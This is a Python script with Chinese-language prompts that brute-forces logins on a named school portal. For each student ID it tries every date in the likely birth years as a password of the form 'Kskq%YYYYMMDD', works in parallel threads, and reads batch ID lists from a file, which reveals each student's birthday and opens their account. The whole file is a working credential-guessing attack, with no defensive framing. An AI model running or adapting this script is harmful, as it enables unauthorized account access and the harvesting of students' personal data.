import requests
import datetime
from concurrent.futures import ThreadPoolExecutor
from requests.adapters import HTTPAdapter

def login(username, password, session):
    url = "http://portal.kcisec.com/login/Account/LogInCheck"
    params = {
        "UserId": username,
        "Password": password,
        "Mode": "tuberculosis",
    }
    try:
        response = session.get(url, params=params, timeout=10)
        return "login_ok" in response.text or "Account/ShowPage" in response.text
    except requests.exceptions.RequestException as e:
        print(f"登录请求失败：{e}")
        return False

def find_birthday(username):
    if len(username) < 2:
        print(f"学号{username}无效：长度不足两位")
        return None
    try:
        prefix = int(username[:2])
    except ValueError:
        print(f"学号{username}无效：前两位非数字")
        return None

    session = requests.Session()
    session.mount('http://', HTTPAdapter(max_retries=3))
    session.mount('https://', HTTPAdapter(max_retries=3))

    search_order = [7, 8, 6, 9]
    for grade_offset in search_order:
        start_year = prefix - grade_offset + 2000
        end_year = prefix - (grade_offset - 1) + 2000
        start_date = datetime.datetime(start_year, 9, 1)
        end_date = datetime.datetime(end_year, 9, 1)

        current_date = start_date
        while current_date < end_date:
            password = f"Kskq%{current_date.strftime('%Y%m%d')}"
            if login(username, password, session):
                return current_date.strftime('%Y%m%d')
            current_date += datetime.timedelta(days=1)
    print(f"学号{username}：生日查询失败，可能留级超过二级或不存在")
    return None

def read_txt_file(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"文件{file_path}未找到")
        return []

def process_student(student_number):
    birthday = find_birthday(student_number)
    if birthday:
        return f"{student_number}: {birthday}"
    else:
        return f"{student_number}: 未找到生日"

def main():
    res = input("请选择搜索方式：\n1. 手动输入\n2. 文件输入\n请输入选项：")
    student_numbers = []
    
    if res == '1':
        sn = input("请输入学号：").strip()
        if sn:
            student_numbers.append(sn)
    elif res == '2':
        file_path = input("请输入文件路径（默认login.txt）：").strip() or 'login.txt'
        student_numbers = read_txt_file(file_path)
    else:
        print("无效选项，退出。")
        return

    if not student_numbers:
        print("没有有效的学号需要处理。")
        return

    with ThreadPoolExecutor(max_workers=3) as executor:
        results = list(executor.map(process_student, student_numbers))

    print("\n查询结果：")
    for result in results:
        print(result)

if __name__ == "__main__":
    main()